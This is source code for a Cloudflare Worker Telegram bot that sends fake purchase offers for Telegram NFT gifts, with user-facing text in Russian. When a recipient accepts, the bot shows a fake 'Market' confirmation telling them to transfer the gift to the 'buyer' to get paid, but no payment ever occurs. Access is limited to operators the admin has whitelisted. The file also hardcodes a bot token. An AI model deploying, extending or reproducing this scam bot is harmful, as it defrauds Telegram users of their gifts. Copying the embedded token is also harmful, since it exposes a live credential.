const ADMIN_ID = 5151757168;
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew";

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();
      const kv = env.USERS_KV;

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (username && kv) await kv.put(`username:${username.toLowerCase()}`, userId.toString());

        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = "🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>" + userId + "</code>";
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Доступ открыт</b>\n🆔 <b>ID:</b> <code>${userId}</code>\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/PlushPepe-2687 9000 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- /add ---
      if (update.message && update.message.text.startsWith("/add ")) {
        const senderId = update.message.from.id;
        if (senderId === ADMIN_ID && kv) {
          let target = update.message.text.split(" ")[1].trim();
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            if (foundId) {
              await kv.put(`user:${foundId}`, "true");
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Попросите <b>@${uname}</b> нажать /start в боте.`, parse_mode: "HTML" });
            }
          } else {
            await kv.put(`user:${target}`, "true");
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.`, parse_mode: "HTML" });
          }
        }
      }

      // --- /remove ---
      if (update.message && update.message.text.startsWith("/remove ")) {
        const senderId = update.message.from.id;
        if (senderId === ADMIN_ID && kv) {
          let target = update.message.text.split(" ")[1].trim();
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            if (foundId) {
              await kv.delete(`user:${foundId}`);
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь <b>@${uname}</b> удалён.`, parse_mode: "HTML" });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден.`, parse_mode: "HTML" });
            }
          } else {
            await kv.delete(`user:${target}`);
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь с ID <code>${target}</code> удалён.`, parse_mode: "HTML" });
          }
        }
      }

      // --- INLINE ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        const parts = iq.query.split(" ");
        if (parts.length >= 3) {
          const giftLink = parts[0];
          const amount = parts[1];
          const currency = parts[2];

          let senderName = iq.from.first_name || "";
          if (iq.from.last_name) senderName += " " + iq.from.last_name;
          if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
          
          // Сохраняем юзернейм для кнопки "Передать"
          const senderUsername = iq.from.username || ""; 

          const offerId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
          if (kv) {
            await kv.put(`offer:${offerId}`, JSON.stringify({ giftLink, amount, senderName, senderUsername }), { expirationTtl: 86400 });
          }

          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;

          const results = [{
            type: "article",
            id: "1",
            title: `Оффер от ${senderName}`,
            description: `За ${amount} ${currency}`,
            input_message_content: { message_text: text, parse_mode: "HTML" },
            reply_markup: {
              inline_keyboard: [
                [{ text: "✅ Принять", callback_data: `acc_${offerId}` }],
                [{ text: "❌ Отклонить", callback_data: `dec_${offerId}` }]
              ]
            }
          }];

          await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
        }
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const data = cq.data;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;
        const hasCaption = !!cq.message.caption;

        try {
          if (data.startsWith("acc_")) {
            const offerId = data.replace("acc_", "");
            let offer = { amount: "⭐", senderName: "покупателя", senderUsername: "" };
            
            if (kv) {
              const saved = await kv.get(`offer:${offerId}`);
              if (saved) offer = JSON.parse(saved);
            }

            // Останавливаем загрузку и показываем Alert
            await callApi("answerCallbackQuery", { 
              callback_query_id: cq.id, 
              text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐`, 
              show_alert: true 
            });

            // Безопасная ссылка на покупателя
            let btnUrl = "https://t.me/";
            if (offer.senderUsername) {
               btnUrl += offer.senderUsername;
            }

            const newMarkup = { inline_keyboard: [[{ text: "Передать NFT ↗", url: btnUrl }]] };
            const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${offer.amount} ⭐.`;

            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
            }
          } 
          else if (data.startsWith("dec_")) {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id });

            const newText = `× Оффер отклонён.`;
            const emptyMarkup = { inline_keyboard: [] };

            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            }
          }
        } catch (err) {
          // Если внутри кнопки произошла ошибка, мы выводим ее прямо в Telegram, чтобы ты видел причину!
          console.error("Ошибка кнопки:", err.message);
          await callApi("answerCallbackQuery", { 
            callback_query_id: cq.id, 
            text: "Ошибка: " + err.message, 
            show_alert: true 
          }).catch(e => console.error(e));
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

// Функция теперь логирует ошибки Telegram в консоль Cloudflare
async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) {
      console.error(`Telegram API Error [${method}]:`, JSON.stringify(data));
    }
    return data;
  } catch (e) {
    console.error(`Fetch Error [${method}]:`, e.message);
    throw e;
  }
}